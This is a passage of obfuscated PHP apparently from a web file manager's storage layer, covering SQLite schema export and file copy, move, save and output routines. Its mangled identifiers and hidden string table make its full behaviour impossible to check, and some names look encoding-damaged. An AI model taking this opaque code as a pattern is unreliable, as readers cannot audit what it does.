(!$ÇóœÔï‰ && $¡ê¢º’÷[$Œ…›°ï[1092]] == $Œ…›°ï[1093]) { $ÇóœÔï‰ = $¡ê¢º’÷[$Œ…›°ï[1094]]; } if (isset($É‰„ÆùÔ[$¡ê¢º’÷[$Œ…›°ï[1092]]])) { $É‰„ÆùÔ[$¡ê¢º’÷[$Œ…›°ï[1092]]][$Œ…›°ï[1095]][] = $¡ê¢º’÷[$Œ…›°ï[1094]]; continue; } $É‰„ÆùÔ[$¡ê¢º’÷[$Œ…›°ï[1092]]] = array($Œ…›°ï[1096] => $¡ê¢º’÷[$Œ…›°ï[1092]], $Œ…›°ï[1095] => array($¡ê¢º’÷[$Œ…›°ï[1094]]), $Œ…›°ï[1097] => $¡ê¢º’÷[$Œ…›°ï[1098]] == $Œ…›°ï[89] ? 0 : 1); } $ö­ìÉÛÄ = array(); foreach ($É‰„ÆùÔ as $¡ê¢º’÷) { $™ã‰Ö’ = $¡ê¢º’÷[$Œ…›°ï[1096]] == $Œ…›°ï[1093]; $â·“‹‘ = array($Œ…›°ï[1099], $¡ê¢º’÷[$Œ…›°ï[1097]] == $Œ…›°ï[89] && !$™ã‰Ö’ ? $Œ…›°ï[1100] : $Œ…›°ï[12], $Œ…›°ï[1101], $Œ…›°ï[1102] . $¶Ãš‚Ú˜ . $Œ…›°ï[11] . ($™ã‰Ö’ ? $Œ…›°ï[1103] : $¡ê¢º’÷[$Œ…›°ï[1096]]) . $Œ…›°ï[119], $Œ…›°ï[1104], $Œ…›°ï[119] . $¶Ãš‚Ú˜ . $Œ…›°ï[119], $Œ…›°ï[1105] . implode($Œ…›°ï[1106], $¡ê¢º’÷[$Œ…›°ï[1095]]) . $Œ…›°ï[1107]); $ö­ìÉÛÄ[] = implode($Œ…›°ï[53], $â·“‹‘) . $Œ…›°ï[71]; } $öêİšÀ = array(); $íõ¥­‘½ = array($Œ…›°ï[1108] => $Œ…›°ï[1109], $Œ…›°ï[1109] => $Œ…›°ï[1109], $Œ…›°ï[285] => $Œ…›°ï[312], $Œ…›°ï[284] => $Œ…›°ï[312]); foreach ($ğŠô¾ã‹ as $¡ê¢º’÷) { $â·“‹‘ = array($Œ…›°ï[119] . $¡ê¢º’÷[$Œ…›°ï[1110]] . $Œ…›°ï[119], isset($íõ¥­‘½[$¡ê¢º’÷[$Œ…›°ï[1111]]]) ? $íõ¥­‘½[$¡ê¢º’÷[$Œ…›°ï[1111]]] : $¡ê¢º’÷[$Œ…›°ï[1112]], $¡ê¢º’÷[$Œ…›°ï[1113]] == $Œ…›°ï[889] ? $Œ…›°ï[1114] : $Œ…›°ï[1115], $¡ê¢º’÷[$Œ…›°ï[1110]] == $ÇóœÔï‰ ? $Œ…›°ï[1116] : $Œ…›°ï[12], $¡ê¢º’÷[$Œ…›°ï[940]] ? strtoupper(str_replace($Œ…›°ï[11], $Œ…›°ï[12], $¡ê¢º’÷[$Œ…›°ï[940]])) : $Œ…›°ï[12]); $öêİšÀ[] = trim(implode($Œ…›°ï[53], $â·“‹‘)); } $²ÜşÆÈ¥ = array($Œ…›°ï[1117] . $¶Ãš‚Ú˜ . $Œ…›°ï[1118], $Œ…›°ï[1119] . $¶Ãš‚Ú˜ . $Œ…›°ï[1120], implode($Œ…›°ï[50] . PHP_EOL, $öêİšÀ), $Œ…›°ï[937]); $Í¾ÈÌ™ = implode(PHP_EOL, array_merge($²ÜşÆÈ¥, $ö­ìÉÛÄ)); if ($Õø‹†ú§ && $Õø‹†ú§ == $Œ…›°ï[13]) { return $Í¾ÈÌ™; } $·×–®å = array($Œ…›°ï[801] => $öªüÑı¾, $Œ…›°ï[13] => $Í¾ÈÌ™); return $Õø‹†ú§ ? $·×–®å[$Õø‹†ú§] : $·×–®å; } public function sqlFromSqlite($¥‹¡±ó, $±€İ…×£ = '') { $“³‘ÓÌÆ =& $_SERVER[Æ š¦İÈ]; $µú°¼×ç = $this->model()->db(); $ëîšŸç‡ = "\120\x52\x41\107\115\101\40\124\101\x42\x4c\105\137\x49\116\x46\117\40\x28\47{$¥‹¡±ó}\47\x29"; $ßÚª‰éö = "\x53\x45\x4c\105\x43\x54\x20\x2a\40\106\x52\117\115\x20\x73\x71\x6c\151\x74\145\137\155\x61\163\x74\145\x72\x20\x57\110\105\122\105\x20\x74\x62\x6c\137\156\141\x6d\145\40\x3d\40\47{$¥‹¡±ó}\47"; $˜À†¹Õ = $µú°¼×ç->query($ëîšŸç‡); if (empty($˜À†¹Õ)) { $çÍŸÈÀ = array($“³‘ÓÌÆ[801] => $“³‘ÓÌÆ[12], $“³‘ÓÌÆ[13] => $“³‘ÓÌÆ[12]); return $±€İ…×£ ? $çÍŸÈÀ[$±€İ…×£] : $çÍŸÈÀ; } $œµ•ö®Æ = $µú°¼×ç->query($ßÚª‰éö); $Ø¿ƒÈŸİ = $õÛ¢Ş†é = array(); foreach ($œµ•ö®Æ as $•õ§°åç) { if ($•õ§°åç[$“³‘ÓÌÆ[33]] == $“³‘ÓÌÆ[276]) { $Ø¿ƒÈŸİ[] = $•õ§°åç[$“³‘ÓÌÆ[1121]]; } else { $õÛ¢Ş†é[$•õ§°åç[$“³‘ÓÌÆ[32]]] = $•õ§°åç[$“³‘ÓÌÆ[1121]]; } } $ ˜á‚âÆ = array_merge(array($“³‘ÓÌÆ[1117] . $¥‹¡±ó . $“³‘ÓÌÆ[119]), $Ø¿ƒÈŸİ, array_values($õÛ¢Ş†é)); $ ˜á‚âÆ = implode($“³‘ÓÌÆ[71] . PHP_EOL, $ ˜á‚âÆ) . $“³‘ÓÌÆ[71]; if ($±€İ…×£ && $±€İ…×£ == $“³‘ÓÌÆ[13]) { return $ ˜á‚âÆ; } $ßúÁáÎà = array(); $¨¦€‹–¦ = array($“³‘ÓÌÆ[1109] => $“³‘ÓÌÆ[1122], $“³‘ÓÌÆ[312] => $“³‘ÓÌÆ[1123]); $Éà²²š = $“³‘ÓÌÆ[12]; foreach ($˜À†¹Õ as $•õ§°åç) { if ($•õ§°åç[$“³‘ÓÌÆ[57]] == $“³‘ÓÌÆ[89]) { $Éà²²š = $•õ§°åç[$“³‘ÓÌÆ[32]]; } $½¾çï©¥ = array($“³‘ÓÌÆ[382] . $•õ§°åç[$“³‘ÓÌÆ[32]] . $“³‘ÓÌÆ[382], isset($¨¦€‹–¦[$•õ§°åç[$“³‘ÓÌÆ[33]]]) ? $¨¦€‹–¦[$•õ§°åç[$“³‘ÓÌÆ[33]]] : $•õ§°åç[$“³‘ÓÌÆ[33]], $•õ§°åç[$“³‘ÓÌÆ[35]] == $“³‘ÓÌÆ[89] ? $“³‘ÓÌÆ[1114] : $“³‘ÓÌÆ[1124] . $•õ§°åç[$“³‘ÓÌÆ[56]], $•õ§°åç[$“³‘ÓÌÆ[57]] == $“³‘ÓÌÆ[89] ? $“³‘ÓÌÆ[1125] : $“³‘ÓÌÆ[12]); $ßúÁáÎà[] = trim(implode($“³‘ÓÌÆ[53], $½¾çï©¥)); } foreach ($õÛ¢Ş†é as $€çµ³à => $Û®€¬é) { $šÒôßèÖ = str_replace($“³‘ÓÌÆ[1126] . $¥‹¡±ó . $“³‘ÓÌÆ[11], $“³‘ÓÌÆ[12], $€çµ³à); $ÕÈë”øØ = str_replace(array($“³‘ÓÌÆ[119], $“³‘ÓÌÆ[948]), $“³‘ÓÌÆ[382], substr($Û®€¬é, stripos($Û®€¬é, $“³‘ÓÌÆ[257]))); if ($šÒôßèÖ == $“³‘ÓÌÆ[1103]) { $Ñ¨Ğ‡Àœ = $“³‘ÓÌÆ[1127] . $Éà²²š . $“³‘ÓÌÆ[1128]; } else { $Ñ¨Ğ‡Àœ = (stripos($šÒôßèÖ, $“³‘ÓÌÆ[11]) ? $“³‘ÓÌÆ[1129] : $“³‘ÓÌÆ[12]) . ($“³‘ÓÌÆ[1130] . $šÒôßèÖ . $“³‘ÓÌÆ[1131] . $ÕÈë”øØ); } $ßúÁáÎà[] = $Ñ¨Ğ‡Àœ; } $¢­ĞÔò¸ = array($“³‘ÓÌÆ[1132] . $¥‹¡±ó . $“³‘ÓÌÆ[1133], $“³‘ÓÌÆ[1134] . $¥‹¡±ó . $“³‘ÓÌÆ[1135], implode($“³‘ÓÌÆ[50] . PHP_EOL, $ßúÁáÎà), $“³‘ÓÌÆ[1136]); $¢ï»ğñ = implode(PHP_EOL, $¢­ĞÔò¸); if ($±€İ…×£ && $±€İ…×£ == $“³‘ÓÌÆ[801]) { return $¢ï»ğñ; } $çÍŸÈÀ = array($“³‘ÓÌÆ[801] => $¢ï»ğñ, $“³‘ÓÌÆ[13] => $ ˜á‚âÆ); return $±€İ…×£ ? $çÍŸÈÀ[$±€İ…×£] : $çÍŸÈÀ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ÉÊËª­, $µ×ç¯½‘) { $¬†ÜŒÚá =& $_SERVER[Æ š¦İÈ]; $ÕÅÍ¾‡í = $µ×ç¯½‘; $GLOBALS[$¬†ÜŒÚá[1137]] = $¬†ÜŒÚá[1138] . $ÉÊËª­; Hook::trigger($¬†ÜŒÚá[1138] . $ÉÊËª­ . $¬†ÜŒÚá[1139], $ÕÅÍ¾‡í); $û²ú‡Í¢ = self::driverMake($µ×ç¯½‘[0]); if (!$û²ú‡Í¢) { return !1; } if (method_exists($û²ú‡Í¢, $ÉÊËª­)) { $çâã ûÅ = @call_user_func_array(array($û²ú‡Í¢, $ÉÊËª­), $µ×ç¯½‘); } else { if (method_exists($û²ú‡Í¢, $¬†ÜŒÚá[1140])) { $çâã ûÅ = @call_user_func_array(array($û²ú‡Í¢, $ÉÊËª­), $µ×ç¯½‘); } else { if (method_exists(self, $ÉÊËª­)) { $çâã ûÅ = @call_user_func_array(array(self, $ÉÊËª­), $µ×ç¯½‘); } else { $çâã ûÅ = call_user_func_array(array(parent, $ÉÊËª­), $µ×ç¯½‘); } } } Hook::trigger($¬†ÜŒÚá[1138] . $ÉÊËª­ . $¬†ÜŒÚá[1141], $ÕÅÍ¾‡í, $çâã ûÅ); return $çâã ûÅ; } public static function init($åˆÙºåÙ) { return self::driverMake($åˆÙºåÙ); } public static function copy($ŸíÊˆà, $¥ÌØÏ‡ş, $ÇÎµ¸˜  = false, $°ø‚ñ×Ñ = false) { return self::copyMoveStart($ŸíÊˆà, $¥ÌØÏ‡ş, $ÇÎµ¸˜ , $_SERVER[Æ š¦İÈ][551], $°ø‚ñ×Ñ); } public static function move($ùòÅº‚¨, $åéÁŞ¼è, $ÆÎòÕàÊ = false, $à™ÆË…Õ = false) { return self::copyMoveStart($ùòÅº‚¨, $åéÁŞ¼è, $ÆÎòÕàÊ, $_SERVER[Æ š¦İÈ][553], $à™ÆË…Õ); } private static function copyMoveStart($â™û¿ á, $†ÇÎí›§, $°äÕ²°³, $©Ş·•è·, $¼Öõ¢È«) { $áò­««Ó =& $_SERVER[Æ š¦İÈ]; $µÚ€¦à­ = array($â™û¿ á, $†ÇÎí›§, $°äÕ²°³, $¼Öõ¢È«); Hook::trigger($áò­««Ó[1138] . $©Ş·•è· . $áò­««Ó[1139], $µÚ€¦à­); $ñ¬õ„˜Ù = self::copyMove($â™û¿ á, $†ÇÎí›§, $°äÕ²°³, $©Ş·•è·, $¼Öõ¢È«); Hook::trigger($áò­««Ó[1138] . $©Ş·•è· . $áò­««Ó[1141], $µÚ€¦à­, $ñ¬õ„˜Ù); return $ñ¬õ„˜Ù; } public static function saveFile($¹Çî™Ú›, $„—ÉÑ®å, $íÑàı§  = true) { $å¤³¬Õ =& $_SERVER[Æ š¦İÈ]; $¨¢‹£›× = self::info($„—ÉÑ®å); $É•ìÃ½ = self::driverMake($¹Çî™Ú›); $ş†‚ˆøÂ = self::driverMake($„—ÉÑ®å); $—ç½ŸŞ‰ = !1; if ($ş†‚ˆøÂ->pathParse[$å¤³¬Õ[1142]]) { $—ç½ŸŞ‰ = $ş†‚ˆøÂ; $£¾ûÀ¯ = $ş†‚ˆøÂ->pathParse[$å¤³¬Õ[1142]]; $ş†‚ˆøÂ = self::driverMake($£¾ûÀ¯); } if ($É•ìÃ½->pathParse[$å¤³¬Õ[1142]]) { $Š‹Üúøæ = $É•ìÃ½->pathParse[$å¤³¬Õ[1142]]; $É•ìÃ½ = self::driverMake($Š‹Üúøæ); } $¼ÁËºÂÂ = $ş†‚ˆøÂ->pathFather($„—ÉÑ®å); $ş½÷ë = !0; if (!$íÑàı§  && self::driverIsSame($É•ìÃ½, $ş†‚ˆøÂ)) { $ş½÷ë = !1; } $œ±­ÄÇÁ = self::copyFile($É•ìÃ½, $¹Çî™Ú›, $ş†‚ˆøÂ, $¼ÁËºÂÂ, $¨¢‹£›×[$å¤³¬Õ[32]], $ş½÷ë); if ($—ç½ŸŞ‰) { $œ±­ÄÇÁ = $—ç½ŸŞ‰->getPathOuter($œ±­ÄÇÁ); } return $œ±­ÄÇÁ; } private static function copyMove($­›¼÷•¤, $î‘«ÏØİ, $Ô‚Üëß, $˜ú”¢¡, $ƒ–æÃ§ó = false) { $÷ğØÍø× =& $_SERVER[Æ š¦İÈ]; if (!$­›¼÷•¤ || $­›¼÷•¤ == $÷ğØÍø×[8] || !$î‘«ÏØİ) { return !1; } ignore_timeout(); $êòÏú¾æ = self::driverMake($­›¼÷•¤); $úƒûâÛ = self::driverMake($î‘«ÏØİ); $Ôõ†µùç = $˜ú”¢¡ == $÷ğØÍø×[553]; $üÇÉè”„ = !1; if ($úƒûâÛ->pathParse[$÷ğØÍø×[1142]]) { $üÇÉè”„ = $úƒûâÛ; $î‘«ÏØİ = $úƒûâÛ->pathParse[$÷ğØÍø×[1142]]; $úƒûâÛ = self::driverMake($î‘«ÏØİ); } if ($êòÏú¾æ->pathParse[$÷ğØÍø×[1142]]) { $­›¼÷•¤ = $êòÏú¾æ->pathParse[$÷ğØÍø×[1142]]; $êòÏú¾æ = self::driverMake($­›¼÷•¤); } self::check($êòÏú¾æ, $­›¼÷•¤, $úƒûâÛ, $î‘«ÏØİ); Hook::trigger($÷ğØÍø×[75], $êòÏú¾æ, $­›¼÷•¤, $úƒûâÛ, $î‘«ÏØİ); $ÚºÑóÇ¢ = self::driverIsSame($êòÏú¾æ, $úƒûâÛ); if ($ÚºÑóÇ¢) { if ($˜ú”¢¡ == $÷ğØÍø×[553] && !method_exists($úƒûâÛ, $÷ğØÍø×[1143]) && trim($î‘«ÏØİ, $÷ğØÍø×[8]) == trim($úƒûâÛ->pathFather($­›¼÷•¤), $÷ğØÍø×[8])) { if ($êòÏú¾æ->pathThis($­›¼÷•¤) != $ƒ–æÃ§ó && !$êòÏú¾æ->isTypeObject()) { return $êòÏú¾æ->rename($­›¼÷•¤, $ƒ–æÃ§ó); } return $úƒûâÛ->getPathOuter($­›¼÷•¤); } if (method_exists($úƒûâÛ, $˜ú”¢¡)) { return $úƒûâÛ->{$˜ú”¢¡}($­›¼÷•¤, $î‘«ÏØİ, $Ô‚Üëß, $ƒ–æÃ§ó); } } if ($ÚºÑóÇ¢ && $˜ú”¢¡ == $÷ğØÍø×[553] && $úƒûâÛ->getType() == $÷ğØÍø×[107]) { $œüÒĞÆÀ = $úƒûâÛ->movePath($­›¼÷•¤, $î‘«ÏØİ, $ƒ–æÃ§ó); if ($œüÒĞÆÀ) { return $œüÒĞÆÀ; } } $©…ˆ¹Æ‡ = $êòÏú¾æ->isFile($­›¼÷•¤); if (!$©…ˆ¹Æ‡ && $úƒûâÛ->getType() == $÷ğØÍø×[755] && $êòÏú¾æ->getType() == $÷ğØÍø×[107]) { $œüÒĞÆÀ = $úƒûâÛ->copyFolderFromIO($êòÏú¾æ, $­›¼÷•¤, $î‘«ÏØİ, $Ô‚Üëß, $Ôõ†µùç, $ƒ–æÃ§ó); } else { $œüÒĞÆÀ = self::copyPath($êòÏú¾æ, $­›¼÷•¤, $úƒûâÛ, $î‘«ÏØİ, $Ô‚Üëß, $Ôõ†µùç, $©…ˆ¹Æ‡, $ƒ–æÃ§ó); } if ($œüÒĞÆÀ && $Ôõ†µùç) { $êòÏú¾æ->remove($­›¼÷•¤); } if ($üÇÉè”„) { $œüÒĞÆÀ = $üÇÉè”„->getPathOuter($œüÒĞÆÀ); } return $œüÒĞÆÀ; } private static function check($Ì»›„‚ä, $¸İóÖÛ, $‹øâÜÒÂ, &$ìà·Ğ«) { $ÑéùÊ†ı =& $_SERVER[Æ š¦İÈ]; if (self::driverIsSame($Ì»›„‚ä, $‹øâÜÒÂ) && $Ì»›„‚ä->isFolder($¸İóÖÛ) && $Ì»›„‚ä->isParentOf($¸İóÖÛ, $ìà·Ğ«)) { show_json(LNG($ÑéùÊ†ı[1144]), !1); } if (!$Ì»›„‚ä->exist($¸İóÖÛ)) { show_json(LNG($ÑéùÊ†ı[106]), !1); } } private static function copyPath($âÖé„û, $ÔÊØ¡ø…, $éúÏò¹Ø, $üöŠ¿, $Ÿ³é˜…Å, $ÓŸ°îúÅ, $¶À†íÕ, $—Üû’‘ = false) { $“¦ú¶ìá =& $_SERVER[Æ š¦İÈ]; $ó—Äè–Î = empty($—Üû’‘) && $—Üû’‘ !== $“¦ú¶ìá[192] ? $âÖé„û->pathThis($ÔÊØ¡ø…) : $—Üû’‘; if ($Ÿ³é˜…Å) { $£ç’Éğ¨ = $éúÏò¹Ø->fileNameExist($üöŠ¿, $ó—Äè–Î); $ó—Äè–Î = $éúÏò¹Ø->fileNameAuto($üöŠ¿, $ó—Äè–Î, $Ÿ³é˜…Å, !$¶À†íÕ); $Ÿ³é˜…Å = $£ç’Éğ¨ ? $Ÿ³é˜…Å : !1; } if ($¶À†íÕ) { return self::copyFile($âÖé„û, $ÔÊØ¡ø…, $éúÏò¹Ø, $üöŠ¿, $ó—Äè–Î, $ÓŸ°îúÅ); } if ($Ÿ³é˜…Å == REPEAT_RENAME_FOLDER) { $Ÿ³é˜…Å = !1; } $¥¼Ù¤š• = rtrim($üöŠ¿, $“¦ú¶ìá[8]) . $“¦ú¶ìá[8] . $ó—Äè–Î; $Óôô•ª— = $éúÏò¹Ø->mkdir($éúÏò¹Ø->getPath($¥¼Ù¤š•)); $üöŠ¿ = $éúÏò¹Ø->getPathInner($Óôô•ª—); $¶ã˜äúÁ = $âÖé„û->listPath($ÔÊØ¡ø…, !0); $¶ã˜äúÁ = is_array($¶ã˜äúÁ) ? $¶ã˜äúÁ : array($“¦ú¶ìá[76] => array(), $“¦ú¶ìá[77] => array()); $ï¤ùÓğÓ = array_merge($¶ã˜äúÁ[$“¦ú¶ìá[76]], $¶ã˜äúÁ[$“¦ú¶ìá[77]]); foreach ($ï¤ùÓğÓ as $äÅ®ÕÚÜ) { $»Âª‹«ç = $äÅ®ÕÚÜ[$“¦ú¶ìá[33]] == $“¦ú¶ìá[194]; $ÔÊØ¡ø… = $âÖé„û->getPathInner($äÅ®ÕÚÜ[$“¦ú¶ìá[78]]); $ğ·•“ë€ = self::copyPath($âÖé„û, $ÔÊØ¡ø…, $éúÏò¹Ø, $üöŠ¿, $Ÿ³é˜…Å, $ÓŸ°îúÅ, $»Âª‹«ç); if (!$ğ·•“ë€) { IO::errorTips($“¦ú¶ìá[1145] . $ÔÊØ¡ø… . $“¦ú¶ìá[70] . $üöŠ¿); } } self::copyMoveKeepInfo($âÖé„û, $ÔÊØ¡ø…, $Óôô•ª—); return $Óôô•ª—; } private static function copyFile($ˆµ–ò¼î, $×ƒ‰Œû, $Éü–ĞÄ, $¢»Ä‚©¶, $øÌÈ×µÆ, $·øÌö¬É) { $×Œ›ªœ‹ =& $_SERVER[Æ š¦İÈ]; $¢»Ä‚©¶ = $Éü–ĞÄ->getPath(rtrim($¢»Ä‚©¶, $×Œ›ªœ‹[8]) . $×Œ›ªœ‹[8] . $øÌÈ×µÆ); $ú¼•åÏ = $×Œ›ªœ‹[1146] . time() . rand_string(5); Hook::trigger($×Œ›ªœ‹[1147], $ˆµ–ò¼î, $×ƒ‰Œû, $Éü–ĞÄ, $¢»Ä‚©¶, $øÌÈ×µÆ, $ú¼•åÏ); if (self::driverIsSame($ˆµ–ò¼î, $Éü–ĞÄ)) { if ($·øÌö¬É) { $˜×ÛÆß = $Éü–ĞÄ->moveFile($×ƒ‰Œû, $¢»Ä‚©¶); } else { $˜×ÛÆß = $Éü–ĞÄ->copyFile($×ƒ‰Œû, $¢»Ä‚©¶); } Hook::trigger($×Œ›ªœ‹[1148], $ˆµ–ò¼î, $×ƒ‰Œû, $Éü–ĞÄ, $¢»Ä‚©¶, $øÌÈ×µÆ, $˜×ÛÆß); self::copyMoveKeepInfo($ˆµ–ò¼î, $×ƒ‰Œû, $˜×ÛÆß); return $˜×ÛÆß; } $ì‹Ò–”º = TEMP_FILES; if ($GLOBALS[$×Œ›ªœ‹[6]][$×Œ›ªœ‹[90]][$×Œ›ªœ‹[793]]) { $ì‹Ò–”º = $GLOBALS[$×Œ›ªœ‹[6]][$×Œ›ªœ‹[90]][$×Œ›ªœ‹[793]]; } $¡ª»‘±¨ = $ì‹Ò–”º; mk_dir($¡ª»‘±¨); $ï¤õæ¸ = $¡ª»‘±¨ . $ú¼•åÏ; $í€˜ƒ— = $ï¤õæ¸; $ï¤õæ¸ = $ˆµ–ò¼î->download($×ƒ‰Œû, $ï¤õæ¸); $ï¤õæ¸ = $ˆµ–ò¼î->iconvApp($ï¤õæ¸); if (substr($ï¤õæ¸, strlen($ì‹Ò–”º)) == $ì‹Ò–”º) { $·øÌö¬É = !0; } $˜×ÛÆß = $Éü–ĞÄ->upload($¢»Ä‚©¶, $ï¤õæ¸, $·øÌö¬É); self::remove($í€˜ƒ—); Hook::trigger($×Œ›ªœ‹[1148], $ˆµ–ò¼î, $×ƒ‰Œû, $Éü–ĞÄ, $¢»Ä‚©¶, $øÌÈ×µÆ, $˜×ÛÆß); self::copyMoveKeepInfo($ˆµ–ò¼î, $×ƒ‰Œû, $˜×ÛÆß); return $˜×ÛÆß; } private static function copyMoveKeepInfo($¿œËóÒ, $šôÍ¨ÙØ, $Ü™’¢Ó¾) { if (!$Ü™’¢Ó¾) { return; } $òé¿€ÒÀ = $¿œËóÒ->info($šôÍ¨ÙØ); if (!is_array($òé¿€ÒÀ)) { return; } IO::setModifyTime($Ü™’¢Ó¾, $òé¿€ÒÀ[$_SERVER[Æ š¦İÈ][86]]); } public static function pathFather($¾ƒ¢©ÕÆ) { $»Ç¡ù†í = IO::init($¾ƒ¢©ÕÆ); $‹š±ÖŒ = $»Ç¡ù†í->pathFather($»Ç¡ù†í->path); return $»Ç¡ù†í->getPathOuter($‹š±ÖŒ); } public static function fileOut($çş¡¬€, $ˆËìõ‰œ = false, $Ú°Ÿ‚•å = false, $ƒŠºë‚Û = '') { $ºç©„““ = self::driverMake($çş¡¬€); if ($ºç©„““->isFileOutServer()) { return $ºç©„““->fileOutServer($çş¡¬€, $ˆËìõ‰œ, $Ú°Ÿ‚•å, $ƒŠºë‚Û); } return $ºç©„““->fileOut($çş¡¬€, $ˆËìõ‰œ, $Ú°Ÿ‚•å, $ƒŠºë‚Û); } public static function fileOutImage($Ó„´£ÍÉ, $ÁïÔƒë = 250) { $§ĞÌÈûŞ = array(250, 600, 1200, 2000, 3000, 5000); for ($—ÛÃœÇî = 0; $—ÛÃœÇî < count($§ĞÌÈûŞ); $—ÛÃœÇî++) { if ($—ÛÃœÇî == 0 && $ÁïÔƒë <= $§ĞÌÈûŞ[$—ÛÃœÇî]) { $ÁïÔƒë = $§ĞÌÈûŞ[$—ÛÃœÇî]; break; } else { if ($ÁïÔƒë > $§ĞÌÈûŞ[$—ÛÃœÇî - 1] && $ÁïÔƒë <= $§ĞÌÈûŞ[$—ÛÃœÇî]) { $ÁïÔƒë = $§ĞÌÈûŞ[$—ÛÃœÇî]; break; } else { if ($—ÛÃœÇî == count($§ĞÌÈûŞ) - 1 && $ÁïÔƒë > $§ĞÌÈûŞ[$—ÛÃœÇî]) { $ÁïÔƒë = $§ĞÌÈûŞ[$—ÛÃœÇî]; break; } } } } $Ä„®—©á = self::driverMake($Ó„´£ÍÉ); if ($Ä„®—©á->isFileOutServer()) { return $Ä„®—©á->fileOutImageServer($Ó„´£ÍÉ, $ÁïÔƒë); } return $Ä„®—©á->fileOutImage($Ó„´£ÍÉ, $ÁïÔƒë); } private static function driverIsSame($®şÒñÀ, $õ‚¬ü²) { $Š¦Ô¶´œ =& $_SERVER[Æ š¦İÈ]; $›ô÷õ°ó = $®şÒñÀ->getType(); $¨È³£É = $õ‚¬ü²->getType(); if ($›ô÷õ°ó != $¨È³£É) { return !1; } if ($›ô÷õ°ó == $Š¦Ô¶´œ[755]) { return !0; } if ($›ô÷õ°ó == $Š¦Ô¶´œ[107]) { return !0; } if ($®şÒñÀ->pathDriver == $õ‚¬ü²->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÎøÅ®Ñ€, $øÕÌÃ ×) { $İğ®¼ä† =& $_SERVER[Æ š¦İÈ]; if (!IO::exist($ÎøÅ®Ñ€)) { return !1; } if (!IO::exist($øÕÌÃ ×)) { IO::mkdir($øÕÌÃ ×); } $éÁ¥Ïìö = self::_listAll($ÎøÅ®Ñ€); $Ê§“¢²ï = self::_listAll($øÕÌÃ ×); $×©¨«­â = array(); $ÂëœŠøç = array(); foreach ($éÁ¥Ïìö as $¿ıˆşŠ => $¬à÷™ª«) { if (isset($Ê§“¢²ï[$¿ıˆşŠ])) { if ($¬à÷™ª«[$İğ®¼ä†[79]] == 1) { continue; } if ($Ê§“¢²ï[$¿ıˆşŠ][$İğ®¼ä†[80]] == $¬à÷™ª«[$İğ®¼ä†[80]]) { continue; } } if ($¬à÷™ª«[$İğ®¼ä†[79]] == 1) { $ÂëœŠøç[] = $øÕÌÃ × . $İğ®¼ä†[8] . $¿ıˆşŠ; continue; } $Š³¥è›æ = strstr(trim($¿ıˆşŠ, $İğ®¼ä†[8]), $İğ®¼ä†[8]) ? get_path_father($¿ıˆşŠ) : $İğ®¼ä†[12]; $×©¨«­â[] = array($İğ®¼ä†[1149] => $¬à÷™ª«[$İğ®¼ä†[78]], $İğ®¼ä†[1150] => rtrim($øÕÌÃ ×, $İğ®¼ä†[8]) . $İğ®¼ä†[8] . $Š³¥è›æ, $İğ®¼ä†[1151] => $¬à÷™ª«); } $“¬ö›–´ = array($İğ®¼ä†[194] => $×©¨«­â, $İğ®¼ä†[79] => $ÂëœŠøç); Hook::trigger($İğ®¼ä†[1152], $ÎøÅ®Ñ€, $øÕÌÃ ×, $“¬ö›–´); foreach ($ÂëœŠøç as $¬à÷™ª«) { IO::mkdir($¬à÷™ª«); } foreach ($×©¨«­â as $¬à÷™ª«) { IO::copy($¬à÷™ª«[$İğ®¼ä†[1149]], $¬à÷™ª«[$İğ®¼ä†[1150]], REPEAT_REPLACE); } } private static function _listAll($Õˆú–Ë›) { $–ìœ‚Ò =& $_SERVER[Æ š¦İÈ]; $Õˆú–Ë› = KodIO::clear($Õˆú–Ë›); $é«¡óüı = IO::listAll($Õˆú–Ë›); foreach ($é«¡óüı as &$ä¶¸ĞĞÒ) { $™ããïşê = substr($ä¶¸ĞĞÒ[$–ìœ‚Ò[78]], strlen($Õˆú–Ë›)); $ä¶¸ĞĞÒ[$–ìœ‚Ò[1153]] = trim($™ããïşê, $–ìœ‚Ò[8]); } unset($ä¶¸ĞĞÒ); return array_to_keyvalue($é«¡óüı, $–ìœ‚Ò[1153]); } public static function fileSubstr($ĞòôçÍ”, $ù ¿ÒÉ‡, $İ¯‰Èšø = false) { $Ô‡Å¦Âæ =& $_SERVER[Æ š¦İÈ]; $¡¼¯‡Šø = self::driverMake($ĞòôçÍ”); $‚¤‚ = $¡¼¯‡Šø->size($ĞòôçÍ”); $¢ŸÇ½¤ = $ù ¿ÒÉ‡; $Ö·¶²œè = $İ¯‰Èšø; if ($ù ¿ÒÉ‡ < 0) { $ù ¿ÒÉ‡ = $‚¤‚ + $ù ¿ÒÉ‡; } if ($İ¯‰Èšø === !1) { $İ¯‰Èšø = $‚¤‚ - $ù ¿ÒÉ‡; } if ($ù ¿ÒÉ‡ + $İ¯‰Èšø > $‚¤‚) { $İ¯‰Èšø = $‚¤‚ - $ù ¿ÒÉ‡; } if (!$‚¤‚ && $¡¼¯‡Šø->getType() == $Ô‡Å¦Âæ[107] && !$¡¼¯‡Šø->exist($ĞòôçÍ”)) { throw new Exception($Ô‡Å¦Âæ[1154] . LNG($Ô‡Å¦Âæ[1155]) . $Ô‡Å¦Âæ[957] . get_path_this($ĞòôçÍ”) . $Ô‡Å¦Âæ[12]); } if ($İ¯‰Èšø <= 0) { return $Ô‡Å¦Âæ[12]; } if ($ù ¿ÒÉ‡ < 0 || $ù ¿ÒÉ‡ >= $‚¤‚ || $İ¯‰Èšø > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\x65\122\x65\141\x64\40\145\x72\162\157\162\x21\x20\163\x74\x61\x72\164\x3d{$ù ¿ÒÉ‡}\x3b\x6c\145\x6e\x67\x74\150\x3d{$İ¯‰Èšø}\x3b\40\x73\151\x7a\145\x3d{$‚¤‚}\73"); } $“°ŒûŞÂ = $¡¼¯‡Šø->fileSubstr($ĞòôçÍ”, $ù ¿ÒÉ‡, $İ¯‰Èšø); if (!$“°ŒûŞÂ && $İ¯‰Èšø && isset($GLOBALS[$Ô‡Å¦Âæ[1156]])) { throw new Exception($GLOBALS[$Ô‡Å¦Âæ[1156]][$Ô‡Å¦Âæ[1157]]); } return $“°ŒûŞÂ; } private static function driverMake(&$ø¯ŸïÂÙ) { $ ¹“É—µ =& $_SERVER[Æ š¦İÈ]; $šúçÃë’ = KodIO::parse($ø¯ŸïÂÙ); if (!self::$driverListSystem) { $é¤“§¨ò = Model($ ¹“É—µ[764])->driverListSystem(); self::$driverListSystem = 